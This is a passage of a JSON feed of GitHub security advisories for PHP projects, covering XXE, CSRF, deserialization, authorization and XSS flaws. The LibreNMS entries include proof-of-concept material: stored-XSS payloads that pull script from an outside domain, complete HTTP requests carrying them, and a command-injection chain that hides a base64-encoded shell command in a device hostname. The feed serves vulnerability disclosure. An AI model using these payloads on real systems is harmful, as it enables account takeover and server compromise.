href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-47873\">https://nvd.nist.gov/vuln/detail/CVE-2024-47873</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php\">https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php</a></li>\n<li><a href=\"https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing\">https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing</a></li>\n<li><a href=\"https://www.w3.org/TR/xml/#sec-guessing-no-ext-info\">https://www.w3.org/TR/xml/#sec-guessing-no-ext-info</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jw4x-v69f-hh5w\">https://github.com/advisories/GHSA-jw4x-v69f-hh5w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jw4x-v69f-hh5w",
            "title": "[phpoffice/phpspreadsheet] XmlScanner bypass leads to XXE",
            "date_modified": "2024-11-18T20:01:24.000Z",
            "date_published": "2024-11-18T20:01:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jw4x-v69f-hh5w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>wallabag version 2.5.2 contains a Cross-Site Request Forgery (CSRF) vulnerability that allows attackers to arbitrarily delete user accounts via the /account/delete endpoint. This issue is fixed in version 2.5.4.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-0737\">https://nvd.nist.gov/vuln/detail/CVE-2023-0737</a></li>\n<li><a href=\"https://github.com/wallabag/wallabag/commit/268372dbbdd7ef87b84617fdebf95d0a86caf7dc\">https://github.com/wallabag/wallabag/commit/268372dbbdd7ef87b84617fdebf95d0a86caf7dc</a></li>\n<li><a href=\"https://huntr.com/bounties/4ba20fe7-4061-4dfb-ab2f-ecaf110641a5\">https://huntr.com/bounties/4ba20fe7-4061-4dfb-ab2f-ecaf110641a5</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-99w8-c5f6-96pp\">https://github.com/advisories/GHSA-99w8-c5f6-96pp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-99w8-c5f6-96pp",
            "title": "[wallabag/wallabag] CSRF leading to delete account in wallabag/wallabag",
            "date_modified": "2024-11-15T21:01:07.000Z",
            "date_published": "2024-11-15T12:31:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-99w8-c5f6-96pp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An Improper Authorization vulnerability exists in Dolibarr versions prior to version 15.0.0. A user with restricted permissions in the 'Reception' section is able to access specific reception details via direct URL access, bypassing the intended permission restrictions.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-3991\">https://nvd.nist.gov/vuln/detail/CVE-2021-3991</a></li>\n<li><a href=\"https://github.com/dolibarr/dolibarr/commit/63cd06394f39d60784d6e6a0ccf4867a71a6568f\">https://github.com/dolibarr/dolibarr/commit/63cd06394f39d60784d6e6a0ccf4867a71a6568f</a></li>\n<li><a href=\"https://huntr.com/bounties/58ddbd8a-0faf-4b3f-aec9-5850bb19ab67\">https://huntr.com/bounties/58ddbd8a-0faf-4b3f-aec9-5850bb19ab67</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wppr-j57c-8jpm\">https://github.com/advisories/GHSA-wppr-j57c-8jpm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wppr-j57c-8jpm",
            "title": "[dolibarr/dolibarr] Improper Authorization in dolibarr/dolibarr",
            "date_modified": "2024-11-15T20:58:32.000Z",
            "date_published": "2024-11-15T12:31:44.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wppr-j57c-8jpm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An improper restriction of external entities (XXE) vulnerability in dompdf/dompdf's SVG parser allows for Server-Side Request Forgery (SSRF) and deserialization attacks. This issue affects all versions prior to 2.0.0. The vulnerability can be exploited even if the isRemoteEnabled option is set to false. It allows attackers to perform SSRF, disclose internal image files, and cause PHAR deserialization attacks.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-3902\">https://nvd.nist.gov/vuln/detail/CVE-2021-3902</a></li>\n<li><a href=\"https://github.com/dompdf/dompdf/commit/f56bc8e40be6c0ae0825e6c7396f4db80620b799\">https://github.com/dompdf/dompdf/commit/f56bc8e40be6c0ae0825e6c7396f4db80620b799</a></li>\n<li><a href=\"https://huntr.com/bounties/a6071c07-806f-429a-8656-a4742e4191b1\">https://huntr.com/bounties/a6071c07-806f-429a-8656-a4742e4191b1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3vjh-xrhf-v9xh\">https://github.com/advisories/GHSA-3vjh-xrhf-v9xh</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3vjh-xrhf-v9xh",
            "title": "[dompdf/dompdf] Improper Restriction of XML External Entity Reference in dompdf/dompdf",
            "date_modified": "2024-11-15T20:49:34.000Z",
            "date_published": "2024-11-15T12:31:44.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3vjh-xrhf-v9xh"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A Stored Cross-Site Scripting (XSS) vulnerability in the \"Services\" tab of the Device page allows authenticated users to inject arbitrary JavaScript through the \"descr\" parameter when adding a service to a device. This vulnerability could result in the execution of malicious code in the context of other users' sessions, potentially compromising their accounts and enabling unauthorized actions.</p>\n<h3 id=\"details\">Details</h3>\n<p>When creating a device through the \"edit device -&gt; services\" workflow (example path: \"/device/15/edit/section=services\"), the attacker can inject an XSS payload in the \"descr\" parameter. This payload is reflected in the \"Services\" tab of the device (URL: \"/device/15/services\"). It is important to note that the vulnerability does not exist when creating devices through the normal \"Add Service\" interface (created through the ajax_form.php request with the \"type=create-service\").</p>\n<p>The payload used to exploit this vulnerability is:\n<code>Descr'\"&gt;&lt;script/src=//15.rs&gt;&lt;/script&gt;</code></p>\n<p>Note: The payload uses the \"15.rs\" domain to bypass some of the length restrictions found during research by pointing to a malicious remote file. The file contains a POC XSS payload, and can contain any arbitrary JS code.</p>\n<p>The root cause is the application's failure to sanitize the \"descr\" parameter before outputting it in the HTML. The sink is as follows:\n<a href=\"https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/device/services.inc.php#L87\">https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/pages/device/services.inc.php#L87</a></p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>Create a service for a device using the following payload in the \"descr\" parameter:</li>\n</ol>\n<p><code>Descr'\"&gt;&lt;script/src=//15.rs&gt;&lt;/script&gt;</code>\n2. Save the service.\n3. Navigate to the \"Services\" tab of the device.\n4. Observe that the injected script executes in the \"Services\" tab.</p>\n<p>Example Request:</p>\n<pre><code class=\"language-http\">POST /device/15/edit/section=services HTTP/1.1\nHost: &lt;your_host&gt;\nContent-Type: application/x-www-form-urlencoded\nCookie: &lt;your_cookie&gt;\n\n_token=&lt;your_token&gt;&amp;name=Name'\"&gt;&lt;script/src=//15.rs&gt;&lt;/script&gt;&amp;addsrv=yes&amp;device=15&amp;type=pollen&amp;descr=Descr'\"&gt;&lt;script/src=//15.rs&gt;&lt;/script&gt;&amp;ip=IP'\"&gt;&lt;script/src=//15.rs&gt;&lt;/script&gt;&amp;params=Params'\"&gt;&lt;script/src=//15.rs&gt;&lt;/script&gt;&amp;Submit=\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>This vulnerability allows authenticated users to inject and execute arbitrary JavaScript in the context of other users' sessions when they visit the \"Services\" tab of the device. This could result in the compromise of user accounts and unauthorized actions performed on their behalf.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/librenms/librenms/security/advisories/GHSA-8fh4-942r-jf2g\">https://github.com/librenms/librenms/security/advisories/GHSA-8fh4-942r-jf2g</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-52526\">https://nvd.nist.gov/vuln/detail/CVE-2024-52526</a></li>\n<li><a href=\"https://github.com/librenms/librenms/commit/30e522c29bbb1f9b72951025e7049a26c7e1d76e\">https://github.com/librenms/librenms/commit/30e522c29bbb1f9b72951025e7049a26c7e1d76e</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8fh4-942r-jf2g\">https://github.com/advisories/GHSA-8fh4-942r-jf2g</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8fh4-942r-jf2g",
            "title": "[librenms/librenms] LibreNMS has a Stored XSS ('Cross-site Scripting') in librenms/includes/html/pages/device/services.inc.php",
            "date_modified": "2024-11-15T20:48:46.000Z",
            "date_published": "2024-11-15T20:48:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8fh4-942r-jf2g"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>sylius/sylius versions prior to 1.9.10, 1.10.11, and 1.11.2 are vulnerable to stored cross-site scripting (XSS) through SVG files. This vulnerability allows attackers to inject malicious scripts that can be executed in the context of the user's browser.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-3841\">https://nvd.nist.gov/vuln/detail/CVE-2021-3841</a></li>\n<li><a href=\"https://github.com/sylius/sylius/commit/3da169e0c23e752974d74223cc536c29a2a82edc\">https://github.com/sylius/sylius/commit/3da169e0c23e752974d74223cc536c29a2a82edc</a></li>\n<li><a href=\"https://huntr.com/bounties/1625506791178-Sylius/Sylius\">https://huntr.com/bounties/1625506791178-Sylius/Sylius</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hhvr-2q69-4563\">https://github.com/advisories/GHSA-hhvr-2q69-4563</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hhvr-2q69-4563",
            "title": "[sylius/sylius] Cross site scripting in sylius/sylius",
            "date_modified": "2024-11-15T20:41:54.000Z",
            "date_published": "2024-11-15T12:31:44.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hhvr-2q69-4563"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>sylius/sylius versions prior to 1.9.10, 1.10.11, and 1.11.2 are vulnerable to stored cross-site scripting (XSS) through SVG files. This vulnerability allows attackers to inject malicious scripts that can be executed in the context of the user's browser.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-3841\">https://nvd.nist.gov/vuln/detail/CVE-2021-3841</a></li>\n<li><a href=\"https://github.com/sylius/sylius/commit/3da169e0c23e752974d74223cc536c29a2a82edc\">https://github.com/sylius/sylius/commit/3da169e0c23e752974d74223cc536c29a2a82edc</a></li>\n<li><a href=\"https://huntr.com/bounties/1625506791178-Sylius/Sylius\">https://huntr.com/bounties/1625506791178-Sylius/Sylius</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hhvr-2q69-4563\">https://github.com/advisories/GHSA-hhvr-2q69-4563</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hhvr-2q69-4563",
            "title": "[sylius/sylius] Cross site scripting in sylius/sylius",
            "date_modified": "2024-11-15T20:41:54.000Z",
            "date_published": "2024-11-15T12:31:44.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hhvr-2q69-4563"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>sylius/sylius versions prior to 1.9.10, 1.10.11, and 1.11.2 are vulnerable to stored cross-site scripting (XSS) through SVG files. This vulnerability allows attackers to inject malicious scripts that can be executed in the context of the user's browser.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-3841\">https://nvd.nist.gov/vuln/detail/CVE-2021-3841</a></li>\n<li><a href=\"https://github.com/sylius/sylius/commit/3da169e0c23e752974d74223cc536c29a2a82edc\">https://github.com/sylius/sylius/commit/3da169e0c23e752974d74223cc536c29a2a82edc</a></li>\n<li><a href=\"https://huntr.com/bounties/1625506791178-Sylius/Sylius\">https://huntr.com/bounties/1625506791178-Sylius/Sylius</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hhvr-2q69-4563\">https://github.com/advisories/GHSA-hhvr-2q69-4563</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hhvr-2q69-4563",
            "title": "[sylius/sylius] Cross site scripting in sylius/sylius",
            "date_modified": "2024-11-15T20:41:54.000Z",
            "date_published": "2024-11-15T12:31:44.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hhvr-2q69-4563"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>DomPDF before version 2.0.0 is vulnerable to PHAR (PHP Archive) deserialization due to a lack of checking on the protocol before passing it into the file_get_contents() function. An attacker who can upload files of any type to the server can pass in the phar:// protocol to unserialize the uploaded file and instantiate arbitrary PHP objects. This can lead to remote code execution, especially when DOMPdf is used with frameworks with documented POP chains like Laravel or vulnerable developer code.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-3838\">https://nvd.nist.gov/vuln/detail/CVE-2021-3838</a></li>\n<li><a href=\"https://github.com/dompdf/dompdf/commit/99aeec1efec9213e87098d42eb09439e7ee0bb6a\">https://github.com/dompdf/dompdf/commit/99aeec1efec9213e87098d42eb09439e7ee0bb6a</a></li>\n<li><a href=\"https://huntr.com/bounties/0bdddc12-ff67-4815-ab9f-6011a974f48e\">https://huntr.com/bounties/0bdddc12-ff67-4815-ab9f-6011a974f48e</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-577p-7j7h-2jgf\">https://github.com/advisories/GHSA-577p-7j7h-2jgf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-577p-7j7h-2jgf",
            "title": "[dompdf/dompdf] Deserialization of Untrusted Data in dompdf/dompdf",
            "date_modified": "2024-11-15T20:36:05.000Z",
            "date_published": "2024-11-15T12:31:44.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-577p-7j7h-2jgf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>An authenticated attacker can create dangerous directory names on the system and alter sensitive configuration parameters through the web portal. Those two defects combined then allows to inject arbitrary OS commands inside <code>shell_exec()</code> calls, thus achieving arbitrary code execution.</p>\n<h3 id=\"details\">Details</h3>\n<h4 id=\"os-command-injection\">OS Command Injection</h4>\n<p>We start by inspecting the file <code>app/Http/Controllers/AboutController.php</code>, more particularly the index() method which is executed upon simply visiting the /about page:</p>\n<pre><code class=\"language-php\">public function index(Request $request)\n    {\n        $version = Version::get();\n\n        return view('about.index', [\n            &lt;TRUNCATED&gt;\n\n            'version_webserver' =&gt; $request-&gt;server('SERVER_SOFTWARE'),\n            'version_rrdtool' =&gt; Rrd::version(),\n            'version_netsnmp' =&gt; str_replace('version: ', '', rtrim(shell_exec(Config::get('snmpget', 'snmpget') . ' -V 2&gt;&amp;1'))),\n\n           &lt;TRUNCATED&gt;\n        ]);\n    }\n</code></pre>\n<p>We can see that the <code>version_netsnmp</code> key receives a value direclty dependent of a <code>shell_exec()</code> call. The argument to this call reflects a configuration parameter with no sanitization. Should an attacker identify a way to alter this parameter, the server is at risk of being compromised.</p>\n<h4 id=\"configuration-parameters-poisoning\">Configuration parameters poisoning</h4>\n<p>We now focus on the <code>update()</code> method of the <code>SettingsController.php</code> script. This method is called when the user visits the route <code>/settings/{key}</code> via HTTP PUT. The key parameter here is simply the name of the configuration key the user wishes to modify.</p>\n<pre><code class=\"language-php\">public function update(DynamicConfig $config, Request $request, $id)\n{\n    $value = $request-&gt;get('value');\n\n    if (! $config-&gt;isValidSetting($id)) {\n        return $this-&gt;jsonResponse($id, ':id is not a valid setting', null, 400);\n    }\n\n    $current = \\LibreNMS\\Config::get($id);\n    $config_item = $config-&gt;get($id);\n\n    if (! $config_item-&gt;checkValue($value)) {\n        return $this-&gt;jsonResponse($id, $config_item-&gt;getValidationMessage($value), $current, 400);\n    }\n\n    if (\\LibreNMS\\Config::persist($id, $value)) {\n        return $this-&gt;jsonResponse($id, \"Successfully set $id\", $value);\n    }\n\n    return $this-&gt;jsonResponse($id, 'Failed to update :id', $current, 400);\n}\n</code></pre>\n<p>We can see that some protections are implemented around the configuration parameters by <code>$config_item-&gt;checkValue($value)</code>, with a format of data being expected depending on the data type of the variable the user wants to modify.\nSpecifically, the <code>snmpget</code> configuration variable expects a valid path to an existing binary on the system.\nTo summarize : if an attacker finds a valid full-path to a system binary, while that full-path also holds shell metacharacters, then those characters would be interpreted by the <code>shell_exec()</code> call defined above and allow for arbitrary command execution.</p>\n<h4 id=\"arbitrary-directory-creation\">Arbitrary directory creation</h4>\n<p>When creating a new Device through the \"Add Device\" page, the server allows the user to send malformed or impossible hostnames and force the data to be stored, with no sanitization being performed on this field.</p>\n<p>In the file <code>app/Jobs/PollDevice.php</code>, the <code>initRrdDirectory()</code> method is responsible for creating a directory named after the Device's hostname. We can see the <code>mkdir()</code> call inside the try block:</p>\n<pre><code class=\"language-php\">private function initRrdDirectory(): void\n{\n    $host_rrd = \\Rrd::name($this-&gt;device-&gt;hostname, '', '');\n    if (Config::get('rrd.enable', true) &amp;&amp; ! is_dir($host_rrd)) {\n        try {\n            mkdir($host_rrd);\n            Log::info(\"Created directory : $host_rrd\");\n        } catch (\\ErrorException $e) {\n            Eventlog::log(\"Failed to create rrd directory: $host_rrd\", $this-&gt;device);\n            Log::info($e);\n        }\n    }\n}\n</code></pre>\n<p>This method is called by <code>initDevice()</code>, which is itself called by the <code>handle()</code> method (executed when the job starts).\n<code>\\Rrd::name()</code> simply concatenates a string following the format <code>&lt;LIBRENMS_INSTALL_DIR&gt;/rrd/&lt;DEVICE_HOSTNAME&gt;</code>.</p>\n<h4 id=\"summary-1\">Summary</h4>\n<p>With all this, an authenticated attacker can:</p>\n<ul>\n<li>Create a malicious Device with shell metacharacters inside its hostname</li>\n<li>Force the creation of directory containing shell metacharacters through the PollDevice job</li>\n<li>Modify the <code>snmpget</code> configuration variable to point to a valid system binary, while also using the directory created in the previous step via a path traversal (i.e: <code>/path/to/install/dir/rrd/&lt;DEVICE_HOSTNAME&gt;/../../../../../../../bin/ls</code>)</li>\n<li>Trigger a code execution via the <code>shell_exec()</code> call contained in the <code>AboutController.php</code> script</li>\n</ul>\n<h4 id=\"\"></h4>\n<h3 id=\"poc\">PoC</h3>\n<p>For proof of concept, we will create a file located at <code>/tmp/rce-proof</code> on the server's filesystem.</p>\n<p>Consider the following command : <code>/usr/bin/touch /tmp/rce-proof</code>, encoded in base64 (<code>L3Vzci9iaW4vdG91Y2ggL3RtcC9yY2UtcHJvb2Y=</code>). This encoding is necesary whenever the command contains '/' characters, as this would otherwise generate invalid directory paths.\nCreate a new Device with a name that contains the command you wish to execute enclosed in semi-colons, ending with a '3' character:\n<img alt=\"librenms-1\" src=\"https://github.com/user-attachments/assets/a242fc1a-f04a-4df9-901e-abcc5f14af14\"></p>\n<p>Be careful to tick the \"Force Add\" option, otherwise the request will be rejected. Click add:\n<img alt=\"librenms-2\" src=\"https://github.com/user-attachments/assets/84e0d853-1418-44aa-870b-4259adba27f8\"></p>\n<p>A directory matching the hostname of the Device will be created whenever a PollDevice job is launched. For the purpose of the demonstration, we will be triggering this manually with artisan:\n<img alt=\"librenms-4\" src=\"https://github.com/user-attachments/assets/ce4061ef-6cb6-4847-a229-1417091048f5\"></p>\n<p>We can confirm that this directory indeed exists on the system:\n<img alt=\"librenms-5\" src=\"https://github.com/user-attachments/assets/79f912c6-f200-47d2-b950-d46636dc30ef\"></p>\n<p>We can now update the <code>snmpget</code> parameter value to point to any binary on the system, making sure that the specified path includes the directory that was just created:\n<img alt=\"librenms-13\" src=\"https://github.com/user-attachments/assets/4b49c2db-c716-41ae-b668-ff6bf3d5d8de\"></p>\n<p>Visiting the <code>/about</code> page will trigger the payload, then we can check that our code was indeed executed:\n<img alt=\"librenms-10\" src=\"https://github.com/user-attachments/assets/8fcf0838-50b5-47e0-85d5-0892d9909c76\"></p>\n<h3 id=\"impact\">Impact</h3>\n<p>Server takeover</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/librenms/librenms/security/advisories/GHSA-x645-6pf9-xwxw\">https://github.com/librenms/librenms/security/advisories/GHSA-x645-6pf9-xwxw</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x645-6pf9-xwxw\">https://github.com/advisories/GHSA-x645-6pf9-xwxw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x645-6pf9-xwxw",
            "title": "[librenms/librenms] LibreNMS has an Authenticated OS Command Injection",
            "date_modified": "2024-11-15T15:54:19.000Z",
            "date_published": "2024-11-15T15:54:18.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x645-6pf9-xwxw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A Stored Cross-Site Scripting (XSS) vulnerability in the \"Custom OID\" tab of a device allows authenticated users to inject arbitrary JavaScript through the \"unit\" parameter when creating a new OID. This vulnerability can lead to the execution of malicious code in the context of other users' sessions, compromising their accounts and enabling unauthorized actions.</p>\n<h3 id=\"details\">Details</h3>\n<p>When creating a new OID for a device, an attacker can inject an XSS payload into the \"unit\" parameter. This payload is reflected in the \"Unit\" column of the table displayed in the \"Custom OID\" tab of the device.</p>\n<p>The payload used to exploit this vulnerability is:\n<code>&lt;script/src=//15.rs&gt;</code></p>\n<p>Note: The payload uses the \"15.rs\" domain to bypass some of the length restrictions found during research by pointing to a malicious remote file. The file contains a POC XSS payload, and can contain any arbitrary JS code.</p>\n<p>The vulnerability is due to improper sanitization of the \"unit\" parameter before rendering it in the HTML output. The sink is as follows:\n<a href=\"https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/print-customoid.php#L90\">https://github.com/librenms/librenms/blob/7f2ae971c4a565b0d7345fa78b4211409f96800a/includes/html/print-customoid.php#L90</a></p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>Create a new OID for a device using the following payload in the \"unit\" parameter:</li>\n</ol>\n<p><code>&lt;script/src=//15.rs&gt;</code>\n2. Save the OID.\n3. Navigate to the \"Custom OID\" tab of the device.\n4. Observe that the injected script executes in the \"Unit\" column of the table.</p>\n<p>Example Request:</p>\n<pre><code class=\"language-http\">POST /ajax_form.php HTTP/1.1\nHost: &lt;your_host&gt;\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-CSRF-TOKEN: &lt;your_token&gt;\nX-Requested-With: XMLHttpRequest\nCookie: &lt;your_cookie&gt;\n\ndevice_id=15&amp;device_name=test4'&amp;ccustomoid_id=2&amp;type=customoid&amp;action=save&amp;name=test1&lt;script&gt;{onerror=alert}throw+'OID'&lt;/script&gt;&amp;oid=test2&lt;script&gt;{onerror=alert}throw+'OID'&lt;/script&gt;&amp;unit=&lt;script/src=//15.rs&gt;&amp;divisor=1&amp;multiplier=1&amp;user_func=test4&lt;script&gt;{onerror=alert}throw+'OID'&lt;/script&gt;&amp;limit=0&amp;limit_low=0&amp;limit_warn=0&amp;limit_low_warn=0&amp;passed=on\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>This vulnerability allows authenticated users to inject and execute arbitrary JavaScript in the context of other users' sessions when they visit the \"Custom OID\" tab of the device. This could lead to the compromise of user accounts and unauthorized actions being performed on their behalf.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/librenms/librenms/security/advisories/GHSA-gv4m-f6fx-859x\">https://github.com/librenms/librenms/security/advisories/GHSA-gv4m-f6fx-859x</a></li>\n<li><a href=\"https://github.com/librenms/librenms/commit/42b156e42a3811c23758772ce8c63d4d3eaba59b\">https://github.com/librenms/librenms/commit/42b156e42a3811c23758772ce8c63d4d3eaba59b</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-51497\">https://nvd.nist.gov/vuln/detail/CVE-2024-51497</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-gv4m-f6fx-859x\">https://github.com/advisories/GHSA-gv4m-f6fx-859x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-gv4m-f6fx-859x",
            "title": "[librenms/librenms] LibreNMS has a Stored XSS ('Cross-site Scripting') in librenms/includes/html/print-customoid.php",
            "date_modified": "2024-11-15T20:50:21.000Z",
            "date_published": "2024-11-15T15:46:32.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-gv4m-f6fx-859x"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}